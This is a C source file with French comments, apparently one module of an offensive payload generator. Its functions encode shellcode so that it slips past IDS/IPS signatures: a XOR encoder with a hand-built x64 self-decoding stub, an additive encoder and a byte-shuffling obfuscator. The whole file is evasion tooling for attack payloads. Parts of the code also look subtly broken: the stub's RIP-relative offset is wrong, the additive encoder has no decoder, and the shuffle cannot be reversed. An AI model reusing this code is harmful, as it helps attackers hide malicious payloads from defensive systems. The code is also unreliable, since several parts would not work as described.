#include "../include/payload_generator.h"
#include <string.h>
#include <stdlib.h>
#include <time.h>

/**
 * Encode le shellcode avec XOR pour contourner les signatures IDS/IPS
 * @param shellcode: Shellcode à encoder
 * @param shellcode_len: Taille du shellcode
 * @param encoded: Buffer de sortie
 * @param key: Clé XOR (0-255). Si 0, génère une clé aléatoire
 * @return: Taille du shellcode encodé (shellcode_len + décodeur), ou -1 en cas d'erreur
 */
int encode_shellcode_xor(const unsigned char *shellcode, int shellcode_len, unsigned char *encoded, unsigned char *key_out) {
    unsigned char key;
    int i;
    int encoded_len = 0;
    
    // Générer une clé aléatoire si non spécifiée
    if (*key_out == 0) {
        srand(time(NULL));
        key = (unsigned char)(rand() % 255 + 1);  // Éviter 0
    } else {
        key = *key_out;
    }
    *key_out = key;
    
    // Décodeur stub Linux x64 (s'auto-décode)
    // Ce décodeur XOR sera ajouté avant le shellcode encodé
    unsigned char decoder[] = {
        0x48, 0x31, 0xc9,                    // xor rcx, rcx
        0x48, 0x81, 0xf9, 0x00, 0x00, 0x00, 0x00,  // cmp rcx, shellcode_len (sera modifié)
        0x74, 0x0f,                          // je end
        0x48, 0x8d, 0x35, 0x00, 0x00, 0x00, 0x00,  // lea rsi, [rip+offset] (sera modifié)
        0x80, 0x34, 0x0e, 0x00,              // xor byte [rsi+rcx], key (sera modifié)
        0x48, 0xff, 0xc1,                    // inc rcx
        0xeb, 0xed,                          // jmp loop
        // end: le shellcode décodé suit
    };
    
    int decoder_len = sizeof(decoder);
    
    // Modifier le décodeur avec la longueur et la clé
    // Offset de shellcode_len dans decoder (après cmp rcx)
    *((unsigned int *)(decoder + 7)) = shellcode_len;
    // Offset du shellcode (après le décodeur)
    *((unsigned int *)(decoder + 14)) = decoder_len;
    // Clé XOR (après xor byte)
    decoder[20] = key;
    
    // Copier le décodeur
    memcpy(encoded, decoder, decoder_len);
    encoded_len = decoder_len;
    
    // Encoder le shellcode avec XOR
    for (i = 0; i < shellcode_len; i++) {
        encoded[encoded_len + i] = shellcode[i] ^ key;
    }
    encoded_len += shellcode_len;
    
    return encoded_len;
}

/**
 * Encode le shellcode avec addition (contournement IDS/IPS)
 * @param shellcode: Shellcode à encoder
 * @param shellcode_len: Taille du shellcode
 * @param encoded: Buffer de sortie
 * @param key: Valeur à ajouter (0-255). Si 0, génère une clé aléatoire
 * @return: Taille du shellcode encodé, ou -1 en cas d'erreur
 */
int encode_shellcode_add(const unsigned char *shellcode, int shellcode_len, unsigned char *encoded, unsigned char *key_out) {
    unsigned char key;
    int i;
    
    // Générer une clé aléatoire si non spécifiée
    if (*key_out == 0) {
        srand(time(NULL));
        key = (unsigned char)(rand() % 255 + 1);
    } else {
        key = *key_out;
    }
    *key_out = key;
    
    // Encoder avec addition
    for (i = 0; i < shellcode_len; i++) {
        encoded[i] = (shellcode[i] + key) & 0xFF;
    }
    
    return shellcode_len;
}

/**
 * Obfusque le shellcode en mélangeant les bytes
 * @param shellcode: Shellcode à obfusquer
 * @param shellcode_len: Taille du shellcode
 * @param obfuscated: Buffer de sortie
 * @return: Taille du shellcode obfusqué, ou -1 en cas d'erreur
 */
int obfuscate_shellcode(const unsigned char *shellcode, int shellcode_len, unsigned char *obfuscated) {
    int i;
    unsigned char temp;
    
    // Copier le shellcode
    memcpy(obfuscated, shellcode, shellcode_len);
    
    // Mélanger les bytes (simple permutation)
    srand(time(NULL));
    for (i = shellcode_len - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        temp = obfuscated[i];
        obfuscated[i] = obfuscated[j];
        obfuscated[j] = temp;
    }
    
    return shellcode_len;
}

